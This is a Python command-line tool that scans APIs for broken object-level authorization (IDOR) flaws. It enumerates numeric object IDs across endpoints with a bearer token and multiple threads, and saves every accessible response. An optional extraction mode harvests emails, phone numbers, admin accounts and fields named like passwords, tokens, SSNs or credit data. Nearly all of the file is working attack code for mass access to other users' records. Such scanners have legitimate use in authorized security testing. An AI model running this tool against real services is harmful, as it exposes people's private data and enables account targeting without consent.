#!/usr/bin/env python3
"""
BOLA/IDOR API Scanner
Tests for broken object level authorization vulnerabilities
"""

import requests
import json
import sys
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse
import time

class BOLAScanner:
    def __init__(self, base_url, token, start_id=1, end_id=1000, threads=10):
        self.base_url = base_url
        self.headers = {
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (API Security Scanner)"
        }
        self.start_id = start_id
        self.end_id = end_id
        self.threads = threads
        self.vulnerable_endpoints = []
        self.session = requests.Session()

    def test_endpoint(self, endpoint_template, user_id):
        """Test a single user ID for IDOR"""
        url = endpoint_template.format(id=user_id)

        try:
            response = self.session.get(
                url,
                headers=self.headers,
                timeout=10,
                allow_redirects=False
            )

            # Success status codes
            if response.status_code in [200, 201]:
                try:
                    data = response.json()
                    return {
                        "id": user_id,
                        "url": url,
                        "status": response.status_code,
                        "length": len(response.text),
                        "data": data
                    }
                except:
                    return {
                        "id": user_id,
                        "url": url,
                        "status": response.status_code,
                        "length": len(response.text),
                        "data": response.text[:200]
                    }

        except requests.exceptions.Timeout:
            return None
        except requests.exceptions.RequestException as e:
            return None

    def scan(self, endpoint_template):
        """Scan range of IDs"""
        print(f"\n[*] Scanning: {endpoint_template}")
        print(f"[*] Testing IDs: {self.start_id} to {self.end_id}")
        print(f"[*] Threads: {self.threads}")
        print("-" * 60)

        found_count = 0
        start_time = time.time()

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            # Submit all tasks
            future_to_id = {
                executor.submit(self.test_endpoint, endpoint_template, uid): uid
                for uid in range(self.start_id, self.end_id + 1)
            }

            # Process results as they complete
            for future in as_completed(future_to_id):
                uid = future_to_id[future]

                try:
                    result = future.result()
                    if result:
                        found_count += 1
                        print(f"[+] VULNERABLE: ID {result['id']:4d} | "
                              f"Status {result['status']} | "
                              f"Length {result['length']:6d}")
                        self.vulnerable_endpoints.append(result)
                except Exception as e:
                    pass

        elapsed = time.time() - start_time
        total = self.end_id - self.start_id + 1

        print("-" * 60)
        print(f"[*] Scan complete in {elapsed:.2f} seconds")
        print(f"[*] Accessible: {found_count}/{total} ({found_count/total*100:.1f}%)")

        if found_count > 0:
            print(f"[!] VULNERABILITY CONFIRMED: BOLA/IDOR exists!")
        else:
            print(f"[✓] No BOLA/IDOR detected")

        return self.vulnerable_endpoints

    def save_results(self, filename="bola_results.json"):
        """Save results to JSON file"""
        with open(filename, 'w') as f:
            json.dump({
                "scan_time": time.strftime("%Y-%m-%d %H:%M:%S"),
                "total_found": len(self.vulnerable_endpoints),
                "endpoints": self.vulnerable_endpoints
            }, f, indent=2)
        print(f"\n[*] Results saved to {filename}")

    def extract_sensitive_data(self):
        """Extract potentially sensitive data from results"""
        print("\n[*] Extracting sensitive data...")

        emails = set()
        phones = set()
        admins = []
        sensitive_fields = []

        for endpoint in self.vulnerable_endpoints:
            data = endpoint.get('data', {})
            if isinstance(data, dict):
                # Extract emails
                if 'email' in data:
                    emails.add(data['email'])

                # Extract phones
                if 'phone' in data:
                    phones.add(data['phone'])

                # Find admins
                if data.get('role') == 'admin' or data.get('is_admin'):
                    admins.append(endpoint['id'])

                # Look for sensitive fields
                sensitive_keywords = ['ssn', 'password', 'secret', 'token', 'key', 'credit']
                for key in data.keys():
                    if any(kw in key.lower() for kw in sensitive_keywords):
                        sensitive_fields.append({
                            'id': endpoint['id'],
                            'field': key,
                            'value': data[key]
                        })

        # Print summary
        if emails:
            print(f"\n[+] Emails found: {len(emails)}")
            for email in list(emails)[:10]:
                print(f"    - {email}")
            if len(emails) > 10:
                print(f"    ... and {len(emails)-10} more")

        if phones:
            print(f"\n[+] Phone numbers found: {len(phones)}")
            for phone in list(phones)[:10]:
                print(f"    - {phone}")

        if admins:
            print(f"\n[!] Admin users found: {admins}")

        if sensitive_fields:
            print(f"\n[!] Sensitive fields found:")
            for field in sensitive_fields[:5]:
                print(f"    - ID {field['id']}: {field['field']}")

def main():
    parser = argparse.ArgumentParser(
        description='BOLA/IDOR API Scanner',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  # Basic scan
  %(prog)s -u "https://api.example.com/api/v1/users/{id}/profile" -t YOUR_TOKEN

  # Custom ID range
  %(prog)s -u "https://api.example.com/api/v1/users/{id}" -t TOKEN --start 1 --end 10000

  # Multiple endpoints
  %(prog)s -u "https://api.example.com/api/v1/users/{id}" \\
           -u "https://api.example.com/api/v1/orders/{id}" \\
           -t TOKEN --threads 20
        '''
    )

    parser.add_argument('-u', '--url', action='append', required=True,
                        help='API endpoint with {id} placeholder (can specify multiple)')
    parser.add_argument('-t', '--token', required=True,
                        help='Bearer token for authentication')
    parser.add_argument('--start', type=int, default=1,
                        help='Start ID (default: 1)')
    parser.add_argument('--end', type=int, default=100,
                        help='End ID (default: 100)')
    parser.add_argument('--threads', type=int, default=10,
                        help='Number of threads (default: 10)')
    parser.add_argument('-o', '--output', default='bola_results.json',
                        help='Output file (default: bola_results.json)')
    parser.add_argument('--extract', action='store_true',
                        help='Extract sensitive data from results')

    args = parser.parse_args()

    # Banner
    print("""
    ╔══════════════════════════════════════╗
    ║     BOLA/IDOR API Scanner v1.0       ║
    ║   Broken Object Level Authorization  ║
    ╚══════════════════════════════════════╝
    """)

    # Initialize scanner
    scanner = BOLAScanner(
        base_url="",
        token=args.token,
        start_id=args.start,
        end_id=args.end,
        threads=args.threads
    )

    # Scan all provided endpoints
    for url in args.url:
        if '{id}' not in url:
            print(f"[!] Warning: URL must contain {{id}} placeholder: {url}")
            continue

        scanner.scan(url)

    # Save results
    if scanner.vulnerable_endpoints:
        scanner.save_results(args.output)

        # Extract sensitive data if requested
        if args.extract:
            scanner.extract_sensitive_data()
    else:
        print("\n[*] No vulnerabilities found")

if __name__ == "__main__":
    main()
